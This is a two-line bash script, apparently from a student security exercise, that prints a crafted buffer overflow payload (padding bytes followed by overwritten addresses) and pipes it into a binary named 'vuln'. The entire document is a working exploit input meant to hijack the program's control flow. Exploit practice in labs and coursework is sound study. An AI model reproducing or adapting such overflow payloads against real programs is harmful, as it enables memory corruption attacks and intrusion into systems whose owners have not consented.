#!/usr/bin/env bash
echo -en $(python -c "print('a'*304 + '\xe4\x88\xff\x43' +'a'*304 + '\x30\xb3\xe5\xe0'+ 'aaaaa')") | /task1/s1813106/vuln

